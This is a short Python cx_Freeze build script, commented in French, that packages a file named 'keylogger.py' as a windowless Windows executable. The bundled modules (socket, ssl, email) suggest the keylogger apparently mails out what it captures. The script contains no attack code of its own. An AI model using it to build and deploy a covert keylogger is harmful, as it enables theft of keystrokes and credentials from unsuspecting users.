# commande à taper en ligne de commande après la sauvegarde de ce fichier:
# python setup.py build

from cx_Freeze import setup, Executable
  
executables = [
        Executable(script = "keylogger.py", base = "Win32GUI")
]
# ne pas mettre "base = ..." si le programme n'est pas en mode graphique, comme c'est le cas pour chiffrement.py.
  
buildOptions = dict( 
        includes = ["ssl", "socket", "platform", "email", "email.mime.base", "email.mime.multipart", "email.mime.text", "os", "threading", "datetime"]
)
  
setup(
    name = "nom_du_programme",
    version = "1.2",
    description = "description du programme",
    author = "votre nom",
    options = dict(build_exe = buildOptions),
    executables = executables
)